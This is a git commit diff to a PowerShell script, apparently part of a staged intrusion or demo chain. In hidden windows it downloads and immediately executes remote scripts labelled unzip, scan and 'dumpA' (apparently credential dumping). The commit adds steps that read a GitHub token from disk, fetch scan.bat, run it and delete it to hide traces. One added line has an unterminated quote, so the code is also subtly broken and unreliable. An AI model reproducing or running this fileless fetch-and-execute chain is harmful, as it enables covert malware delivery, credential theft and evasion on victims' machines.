314f003ca60a861e2ad8c73638355df0e3703beb
tameval <114147355+tameval@users.noreply.github.com>
2022-10-20 19:09:49 +0900

    Update init_124509.ps1

--- init_124509.ps1
+++ init_124509.ps1
@@ -4,7 +4,11 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/unzip_124509')"
 
 #scanning
-#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan_124509')"
+$tkn= Get-Content "C:\CRDemo\tkn.txt
+$headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}
+Invoke-WebRequest "https://raw.githubusercontent.com/tameval/script/main/scan_124509" -Headers $headers -OutFile $env:TEMP\scan.bat
+Start-Process $env:TEMP\scan.bat
+Remove-Item $env:TEMP\scan.bat
 
 #dumpA
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/cdumpa_124509')"
